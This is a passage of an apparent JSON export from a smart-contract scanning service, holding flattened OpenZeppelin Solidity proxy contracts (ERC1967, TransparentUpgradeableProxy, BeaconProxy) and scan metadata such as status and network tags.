`recipient`, care must be\r\n     * taken to not create reentrancy vulnerabilities. Consider using\r\n     * {ReentrancyGuard} or the\r\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\r\n     */\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    /**\r\n     * @dev Performs a Solidity function call using a low level `call`. A\r\n     * plain`call` is an unsafe replacement for a function call: use this\r\n     * function instead.\r\n     *\r\n     * If `target` reverts with a revert reason, it is bubbled up by this\r\n     * function (like regular Solidity function calls).\r\n     *\r\n     * Returns the raw returned data. To convert to the expected return value,\r\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `target` must be a contract.\r\n     * - calling `target` with `data` must not revert.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n      return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\r\n     * `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but also transferring `value` wei to `target`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - the calling contract must have an ETH balance of at least `value`.\r\n     * - the called Solidity function must be `payable`.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\r\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.call{ value: value }(data);\r\n        return _verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but performing a static call.\r\n     *\r\n     * _Available since v3.3._\r\n     */\r\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\r\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\r\n     * but performing a static call.\r\n     *\r\n     * _Available since v3.3._\r\n     */\r\n    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {\r\n        require(isContract(target), \"Address: static call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.staticcall(data);\r\n        return _verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but performing a delegate call.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\r\n     * but performing a delegate call.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        require(isContract(target), \"Address: delegate call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.delegatecall(data);\r\n        return _verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            // Look for revert reason and bubble it up if present\r\n            if (returndata.length > 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n\r\n                // solhint-disable-next-line no-inline-assembly\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n/**\r\n * @dev This is the interface that {BeaconProxy} expects of its beacon.\r\n */\r\ninterface IBeacon {\r\n    /**\r\n     * @dev Must return an address that can be used as a delegate call target.\r\n     *\r\n     * {BeaconProxy} will check that this address is a contract.\r\n     */\r\n    function implementation() external view returns (address);\r\n}\r\n\r\n/**\r\n * @dev This abstract contract provides getters and event emitting update functions for\r\n * https://eips.ethereum.org/EIPS/eip-1967[EIP1967] slots.\r\n *\r\n * _Available since v4.1._\r\n *\r\n * @custom:oz-upgrades-unsafe-allow delegatecall\r\n */\r\nabstract contract ERC1967Upgrade {\r\n    // This is the keccak-256 hash of \"eip1967.proxy.rollback\" subtracted by 1\r\n    bytes32 private constant _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;\r\n\r\n    /**\r\n     * @dev Storage slot with the address of the current implementation.\r\n     * This is the keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1, and is\r\n     * validated in the constructor.\r\n     */\r\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\r\n\r\n    /**\r\n     * @dev Emitted when the implementation is upgraded.\r\n     */\r\n    event Upgraded(address indexed implementation);\r\n\r\n    /**\r\n     * @dev Returns the current implementation address.\r\n     */\r\n    function _getImplementation() internal view returns (address) {\r\n        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\r\n    }\r\n\r\n    /**\r\n     * @dev Stores a new address in the EIP1967 implementation slot.\r\n     */\r\n    function _setImplementation(address newImplementation) private {\r\n        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\r\n        StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;\r\n    }\r\n\r\n    /**\r\n     * @dev Perform implementation upgrade\r\n     *\r\n     * Emits an {Upgraded} event.\r\n     */\r\n    function _upgradeTo(address newImplementation) internal {\r\n        _setImplementation(newImplementation);\r\n        emit Upgraded(newImplementation);\r\n    }\r\n\r\n    /**\r\n     * @dev Perform implementation upgrade with additional setup call.\r\n     *\r\n     * Emits an {Upgraded} event.\r\n     */\r\n    function _upgradeToAndCall(address newImplementation, bytes memory data, bool forceCall) internal {\r\n        _setImplementation(newImplementation);\r\n        emit Upgraded(newImplementation);\r\n        if (data.length > 0 || forceCall) {\r\n            Address.functionDelegateCall(newImplementation, data);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\r\n     *\r\n     * Emits an {Upgraded} event.\r\n     */\r\n    function _upgradeToAndCallSecure(address newImplementation, bytes memory data, bool forceCall) internal {\r\n        address oldImplementation = _getImplementation();\r\n\r\n        // Initial upgrade and setup call\r\n        _setImplementation(newImplementation);\r\n        if (data.length > 0 || forceCall) {\r\n            Address.functionDelegateCall(newImplementation, data);\r\n        }\r\n\r\n        // Perform rollback test if not already in progress\r\n        StorageSlot.BooleanSlot storage rollbackTesting = StorageSlot.getBooleanSlot(_ROLLBACK_SLOT);\r\n        if (!rollbackTesting.value) {\r\n            // Trigger rollback using upgradeTo from the new implementation\r\n            rollbackTesting.value = true;\r\n            Address.functionDelegateCall(\r\n                newImplementation,\r\n                abi.encodeWithSignature(\r\n                    \"upgradeTo(address)\",\r\n                    oldImplementation\r\n                )\r\n            );\r\n            rollbackTesting.value = false;\r\n            // Check rollback was effective\r\n            require(oldImplementation == _getImplementation(), \"ERC1967Upgrade: upgrade breaks further upgrades\");\r\n            // Finally reset to the new implementation and log the upgrade\r\n            _setImplementation(newImplementation);\r\n            emit Upgraded(newImplementation);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Perform beacon upgrade with additional setup call. Note: This upgrades the address of the beacon, it does\r\n     * not upgrade the implementation contained in the beacon (see {UpgradeableBeacon-_setImplementation} for that).\r\n     *\r\n     * Emits a {BeaconUpgraded} event.\r\n     */\r\n    function _upgradeBeaconToAndCall(address newBeacon, bytes memory data, bool forceCall) internal {\r\n        _setBeacon(newBeacon);\r\n        emit BeaconUpgraded(newBeacon);\r\n        if (data.length > 0 || forceCall) {\r\n            Address.functionDelegateCall(IBeacon(newBeacon).implementation(), data);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Storage slot with the admin of the contract.\r\n     * This is the keccak-256 hash of \"eip1967.proxy.admin\" subtracted by 1, and is\r\n     * validated in the constructor.\r\n     */\r\n    bytes32 internal constant _ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;\r\n\r\n    /**\r\n     * @dev Emitted when the admin account has changed.\r\n     */\r\n    event AdminChanged(address previousAdmin, address newAdmin);\r\n\r\n    /**\r\n     * @dev Returns the current admin.\r\n     */\r\n    function _getAdmin() internal view returns (address) {\r\n        return StorageSlot.getAddressSlot(_ADMIN_SLOT).value;\r\n    }\r\n\r\n    /**\r\n     * @dev Stores a new address in the EIP1967 admin slot.\r\n     */\r\n    function _setAdmin(address newAdmin) private {\r\n        require(newAdmin != address(0), \"ERC1967: new admin is the zero address\");\r\n        StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin;\r\n    }\r\n\r\n    /**\r\n     * @dev Changes the admin of the proxy.\r\n     *\r\n     * Emits an {AdminChanged} event.\r\n     */\r\n    function _changeAdmin(address newAdmin) internal {\r\n        emit AdminChanged(_getAdmin(), newAdmin);\r\n        _setAdmin(newAdmin);\r\n    }\r\n\r\n    /**\r\n     * @dev The storage slot of the UpgradeableBeacon contract which defines the implementation for this proxy.\r\n     * This is bytes32(uint256(keccak256('eip1967.proxy.beacon')) - 1)) and is validated in the constructor.\r\n     */\r\n    bytes32 internal constant _BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;\r\n\r\n    /**\r\n     * @dev Emitted when the beacon is upgraded.\r\n     */\r\n    event BeaconUpgraded(address indexed beacon);\r\n\r\n    /**\r\n     * @dev Returns the current beacon.\r\n     */\r\n    function _getBeacon() internal view returns (address) {\r\n        return StorageSlot.getAddressSlot(_BEACON_SLOT).value;\r\n    }\r\n\r\n    /**\r\n     * @dev Stores a new beacon in the EIP1967 beacon slot.\r\n     */\r\n    function _setBeacon(address newBeacon) private {\r\n        require(\r\n            Address.isContract(newBeacon),\r\n            \"ERC1967: new beacon is not a contract\"\r\n        );\r\n        require(\r\n            Address.isContract(IBeacon(newBeacon).implementation()),\r\n            \"ERC1967: beacon implementation is not a contract\"\r\n        );\r\n        StorageSlot.getAddressSlot(_BEACON_SLOT).value = newBeacon;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev This abstract contract provides a fallback function that delegates all calls to another contract using the EVM\r\n * instruction `delegatecall`. We refer to the second contract as the _implementation_ behind the proxy, and it has to\r\n * be specified by overriding the virtual {_implementation} function.\r\n *\r\n * Additionally, delegation to the implementation can be triggered manually through the {_fallback} function, or to a\r\n * different contract through the {_delegate} function.\r\n *\r\n * The success and return data of the delegated call will be returned back to the caller of the proxy.\r\n */\r\nabstract contract Proxy {\r\n    /**\r\n     * @dev Delegates the current call to `implementation`.\r\n     *\r\n     * This function does not return to its internall call site, it will return directly to the external caller.\r\n     */\r\n    function _delegate(address implementation) internal virtual {\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly {\r\n            // Copy msg.data. We take full control of memory in this inline assembly\r\n            // block because it will not return to Solidity code. We overwrite the\r\n            // Solidity scratch pad at memory position 0.\r\n            calldatacopy(0, 0, calldatasize())\r\n\r\n            // Call the implementation.\r\n            // out and outsize are 0 because we don't know the size yet.\r\n            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\r\n\r\n            // Copy the returned data.\r\n            returndatacopy(0, 0, returndatasize())\r\n\r\n            switch result\r\n            // delegatecall returns 0 on error.\r\n            case 0 { revert(0, returndatasize()) }\r\n            default { return(0, returndatasize()) }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev This is a virtual function that should be overriden so it returns the address to which the fallback function\r\n     * and {_fallback} should delegate.\r\n     */\r\n    function _implementation() internal view virtual returns (address);\r\n\r\n    /**\r\n     * @dev Delegates the current call to the address returned by `_implementation()`.\r\n     *\r\n     * This function does not return to its internall call site, it will return directly to the external caller.\r\n     */\r\n    function _fallback() internal virtual {\r\n        _beforeFallback();\r\n        _delegate(_implementation());\r\n    }\r\n\r\n    /**\r\n     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other\r\n     * function in the contract matches the call data.\r\n     */\r\n    fallback () external payable virtual {\r\n        _fallback();\r\n    }\r\n\r\n    /**\r\n     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data\r\n     * is empty.\r\n     */\r\n    receive () external payable virtual {\r\n        _fallback();\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`\r\n     * call, or as part of the Solidity `fallback` or `receive` functions.\r\n     *\r\n     * If overriden should call `super._beforeFallback()`.\r\n     */\r\n    function _beforeFallback() internal virtual {\r\n    }\r\n}\r\n\r\n/**\r\n * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an\r\n * implementation address that can be changed. This address is stored in storage in the location specified by\r\n * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn't conflict with the storage layout of the\r\n * implementation behind the proxy.\r\n */\r\ncontract ERC1967Proxy is Proxy, ERC1967Upgrade {\r\n    /**\r\n     * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\r\n     *\r\n     * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This will typically be an encoded\r\n     * function call, and allows initializating the storage of the proxy like a Solidity constructor.\r\n     */\r\n    constructor(address _logic, bytes memory _data) payable {\r\n        assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"eip1967.proxy.implementation\")) - 1));\r\n        _upgradeToAndCall(_logic, _data, false);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the current implementation address.\r\n     */\r\n    function _implementation() internal view virtual override returns (address impl) {\r\n        return ERC1967Upgrade._getImplementation();\r\n    }\r\n}\r\n\r\n/**\r\n * @dev This contract implements a proxy that is upgradeable by an admin.\r\n *\r\n * To avoid https://medium.com/nomic-labs-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357[proxy selector\r\n * clashing], which can potentially be used in an attack, this contract uses the\r\n * https://blog.openzeppelin.com/the-transparent-proxy-pattern/[transparent proxy pattern]. This pattern implies two\r\n * things that go hand in hand:\r\n *\r\n * 1. If any account other than the admin calls the proxy, the call will be forwarded to the implementation, even if\r\n * that call matches one of the admin functions exposed by the proxy itself.\r\n * 2. If the admin calls the proxy, it can access the admin functions, but its calls will never be forwarded to the\r\n * implementation. If the admin tries to call a function on the implementation it will fail with an error that says\r\n * \"admin cannot fallback to proxy target\".\r\n *\r\n * These properties mean that the admin account can only be used for admin actions like upgrading the proxy or changing\r\n * the admin, so it's best if it's a dedicated account that is not used for anything else. This will avoid headaches due\r\n * to sudden errors when trying to call a function from the proxy implementation.\r\n *\r\n * Our recommendation is for the dedicated account to be an instance of the {ProxyAdmin} contract. If set up this way,\r\n * you should think of the `ProxyAdmin` instance as the real administrative interface of your proxy.\r\n */\r\ncontract TransparentUpgradeableProxy is ERC1967Proxy {\r\n    /**\r\n     * @dev Initializes an upgradeable proxy managed by `_admin`, backed by the implementation at `_logic`, and\r\n     * optionally initialized with `_data` as explained in {ERC1967Proxy-constructor}.\r\n     */\r\n    constructor(address _logic, address admin_, bytes memory _data) payable ERC1967Proxy(_logic, _data) {\r\n        assert(_ADMIN_SLOT == bytes32(uint256(keccak256(\"eip1967.proxy.admin\")) - 1));\r\n        _changeAdmin(admin_);\r\n    }\r\n\r\n    /**\r\n     * @dev Modifier used internally that will delegate the call to the implementation unless the sender is the admin.\r\n     */\r\n    modifier ifAdmin() {\r\n        if (msg.sender == _getAdmin()) {\r\n            _;\r\n        } else {\r\n            _fallback();\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the current admin.\r\n     *\r\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-getProxyAdmin}.\r\n     *\r\n     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the\r\n     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.\r\n     * `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`\r\n     */\r\n    function admin() external ifAdmin returns (address admin_) {\r\n        admin_ = _getAdmin();\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the current implementation.\r\n     *\r\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-getProxyImplementation}.\r\n     *\r\n     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the\r\n     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.\r\n     * `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`\r\n     */\r\n    function implementation() external ifAdmin returns (address implementation_) {\r\n        implementation_ = _implementation();\r\n    }\r\n\r\n    /**\r\n     * @dev Changes the admin of the proxy.\r\n     *\r\n     * Emits an {AdminChanged} event.\r\n     *\r\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-changeProxyAdmin}.\r\n     */\r\n    function changeAdmin(address newAdmin) external virtual ifAdmin {\r\n        _changeAdmin(newAdmin);\r\n    }\r\n\r\n    /**\r\n     * @dev Upgrade the implementation of the proxy.\r\n     *\r\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-upgrade}.\r\n     */\r\n    function upgradeTo(address newImplementation) external ifAdmin {\r\n        _upgradeToAndCall(newImplementation, bytes(\"\"), false);\r\n    }\r\n\r\n    /**\r\n     * @dev Upgrade the implementation of the proxy, and then call a function from the new implementation as specified\r\n     * by `data`, which should be an encoded function call. This is useful to initialize new storage variables in the\r\n     * proxied contract.\r\n     *\r\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-upgradeAndCall}.\r\n     */\r\n    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable ifAdmin {\r\n        _upgradeToAndCall(newImplementation, data, true);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the current admin.\r\n     */\r\n    function _admin() internal view virtual returns (address) {\r\n        return _getAdmin();\r\n    }\r\n\r\n    /**\r\n     * @dev Makes sure the admin cannot access the fallback function. See {Proxy-_beforeFallback}.\r\n     */\r\n    function _beforeFallback() internal virtual override {\r\n        require(msg.sender != _getAdmin(), \"TransparentUpgradeableProxy: admin cannot fallback to proxy target\");\r\n        super._beforeFallback();\r\n    }\r\n}","contract_language":"solidity","status":"analyzing","created_at":"2025-08-30T13:49:00.976Z","completed_at":null,"user_id":null,"contract_source":"live-scan","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":"Live Scan: TransparentUpgradeableProxy","public_description":"Automated security analysis of TransparentUpgradeableProxy contract from arbitrum network","tags":["live-scan","arbitrum","unknown"],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false},{"id":"36009195-cc31-401c-84aa-e4c0b47dc178","session_key":"b8c3ba34-82e7-46fd-ab52-d0ef242a26e5","contract_code":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol\";\nimport \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\n// Kept for backwards compatibility with older versions of Hardhat and Truffle plugins.\ncontract AdminUpgradeabilityProxy is TransparentUpgradeableProxy {\n    constructor(address logic, address admin, bytes memory data) payable TransparentUpgradeableProxy(logic, admin, data) {}\n}\n","contract_language":"solidity","status":"pending","created_at":"2025-08-30T16:32:39.959Z","completed_at":null,"user_id":null,"contract_source":"live-scan","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":"Live Scan: ERC1967Proxy","public_description":"Automated security analysis of ERC1967Proxy contract from ethereum network","tags":["live-scan","ethereum","unknown"],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false},{"id":"383222ac-4e25-4dcd-849c-34e0d06366ee","session_key":"8cb2e618-5b30-4388-b8bb-749bdcc1642d","contract_code":"// File: contracts/import.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol\";\nimport \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\n// Kept for backwards compatibility with older versions of Hardhat and Truffle plugins.\ncontract AdminUpgradeabilityProxy is TransparentUpgradeableProxy {\n    constructor(address logic, address admin, bytes memory data) payable TransparentUpgradeableProxy(logic, admin, data) {}\n}\n\n\n// File: @openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./IBeacon.sol\";\nimport \"../Proxy.sol\";\nimport \"../ERC1967/ERC1967Upgrade.sol\";\n\n/**\n * @dev This contract implements a proxy that gets the implementation address for each call from a {UpgradeableBeacon}.\n *\n * The beacon address is stored in storage slot `uint256(keccak256('eip1967.proxy.beacon')) - 1`, so that it doesn't\n * conflict with the storage layout of the implementation behind the proxy.\n *\n * _Available since v3.4._\n */\ncontract BeaconProxy is Proxy, ERC1967Upgrade {\n    /**\n     * @dev Initializes the proxy with `beacon`.\n     *\n     * If `data` is nonempty, it's used as data in a delegate call to the implementation returned by the beacon. This\n     * will typically be an encoded function call, and allows initializating the storage of the proxy like a Solidity\n     * constructor.\n     *\n     * Requirements:\n     *\n     * - `beacon` must be a contract with the interface {IBeacon}.\n     */\n    constructor(address beacon, bytes memory data) payable {\n        assert(_BEACON_SLOT == bytes32(uint256(keccak256(\"eip1967.proxy.beacon\")) - 1));\n        _upgradeBeaconToAndCall(beacon, data, false);\n    }\n\n    /**\n     * @dev Returns the current beacon address.\n     */\n    function _beacon() internal view virtual returns (address) {\n        return _getBeacon();\n    }\n\n    /**\n     * @dev Returns the current implementation address of the associated beacon.\n     */\n    function _implementation() internal view virtual override returns (address) {\n        return IBeacon(_getBeacon()).implementation();\n    }\n\n    /**\n     * @dev Changes the proxy to use a new beacon. Deprecated: see {_upgradeBeaconToAndCall}.\n     *\n     * If `data` is nonempty, it's used as data in a delegate call to the implementation returned by the beacon.\n     *\n     * Requirements:\n     *\n     * - `beacon` must be a contract.\n     * - The implementation returned by `beacon` must be a contract.\n     */\n    function _setBeacon(address beacon, bytes memory data) internal virtual {\n        _upgradeBeaconToAndCall(beacon, data, false);\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./IBeacon.sol\";\nimport \"../../access/Ownable.sol\";\nimport \"../../utils/Address.sol\";\n\n/**\n * @dev This contract is used in conjunction with one or more instances of {BeaconProxy} to determine their\n * implementation contract, which is where they will delegate all function calls.\n *\n * An owner is able to change the implementation the beacon points to, thus upgrading the proxies that use this beacon.\n */\ncontract UpgradeableBeacon is IBeacon, Ownable {\n    address private _implementation;\n\n    /**\n     * @dev Emitted when the implementation returned by the beacon is changed.\n     */\n    event Upgraded(address indexed implementation);\n\n    /**\n     * @dev Sets the address of the initial implementation, and the deployer account as the owner who can upgrade the\n     * beacon.\n     */\n    constructor(address implementation_) {\n        _setImplementation(implementation_);\n    }\n\n    /**\n     * @dev Returns the current implementation address.\n     */\n    function implementation() public view virtual override returns (address) {\n        return _implementation;\n    }\n\n    /**\n     * @dev Upgrades the beacon to a new implementation.\n     *\n     * Emits an {Upgraded} event.\n     *\n     * Requirements:\n     *\n     * - msg.sender must be the owner of the contract.\n     * - `newImplementation` must be a contract.\n     */\n    function upgradeTo(address newImplementation) public virtual onlyOwner {\n        _setImplementation(newImplementation);\n        emit Upgraded(newImplementation);\n    }\n\n    /**\n     * @dev Sets the implementation contract address for this beacon\n     *\n     * Requirements:\n     *\n     * - `newImplementation` must be a contract.\n     */\n    function _setImplementation(address newImplementation) private {\n        require(Address.isContract(newImplementation), \"UpgradeableBeacon: implementation is not a contract\");\n        _implementation = newImplementation;\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"../Proxy.sol\";\nimport \"./ERC1967Upgrade.sol\";\n\n/**\n * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an\n * implementation address that can be changed. This address is stored in storage in the location specified by\n * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn't conflict with the storage layout of the\n * implementation behind the proxy.\n */\ncontract ERC1967Proxy is Proxy, ERC1967Upgrade {\n    /**\n     * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n     *\n     * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This will typically be an encoded\n     * function call, and allows initializating the storage of the proxy like a Solidity constructor.\n     */\n    constructor(address _logic, bytes memory _data) payable {\n        assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"eip1967.proxy.implementation\")) - 1));\n        _upgradeToAndCall(_logic, _data, false);\n    }\n\n    /**\n     * @dev Returns the current implementation address.\n     */\n    function _implementation() internal view virtual override returns (address impl) {\n        return ERC1967Upgrade._getImplementation();\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"../ERC1967/ERC1967Proxy.sol\";\n\n/**\n * @dev This contract implements a proxy that is upgradeable by an admin.\n *\n * To avoid https://medium.com/nomic-labs-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357[proxy selector\n * clashing], which can potentially be used in an attack, this contract uses the\n * https://blog.openzeppelin.com/the-transparent-proxy-pattern/[transparent proxy pattern]. This pattern implies two\n * things that go hand in hand:\n *\n * 1. If any account other than the admin calls the proxy, the call will be forwarded to the implementation, even if\n * that call matches one of the admin functions exposed by the proxy itself.\n * 2. If the admin calls the proxy, it can access the admin functions, but its calls will never be forwarded to the\n * implementation. If the admin tries to call a function on the implementation it will fail with an error that says\n * \"admin cannot fallback to proxy target\".\n *\n * These properties mean that the admin account can only be used for admin actions like upgrading the proxy or changing\n * the admin, so it's best if it's a dedicated account that is not used for anything else. This will avoid headaches due\n * to sudden errors when trying to call a function from the proxy implementation.\n *\n * Our recommendation is for the dedicated account to be an instance of the {ProxyAdmin} contract. If set up this way,\n * you should think of the `ProxyAdmin` instance as the real administrative interface of your proxy.\n */\ncontract TransparentUpgradeableProxy is ERC1967Proxy {\n    /**\n     * @dev Initializes an upgradeable proxy managed by `_admin`, backed by the implementation at `_logic`, and\n     * optionally initialized with `_data` as explained in {ERC1967Proxy-constructor}.\n     */\n    constructor(address _logic, address admin_, bytes memory _data) payable ERC1967Proxy(_logic, _data) {\n        assert(_ADMIN_SLOT == bytes32(uint256(keccak256(\"eip1967.proxy.admin\")) - 1));\n        _changeAdmin(admin_);\n    }\n\n    /**\n     * @dev Modifier used internally that will delegate the call to the implementation unless the sender is the admin.\n     */\n    modifier ifAdmin() {\n        if (msg.sender == _getAdmin()) {\n            _;\n        } else {\n            _fallback();\n        }\n    }\n\n    /**\n     * @dev Returns the current admin.\n     *\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-getProxyAdmin}.\n     *\n     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the\n     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.\n     * `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`\n     */\n    function admin() external ifAdmin returns (address admin_) {\n        admin_ = _getAdmin();\n    }\n\n    /**\n     * @dev Returns the current implementation.\n     *\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-getProxyImplementation}.\n     *\n     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the\n     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.\n     * 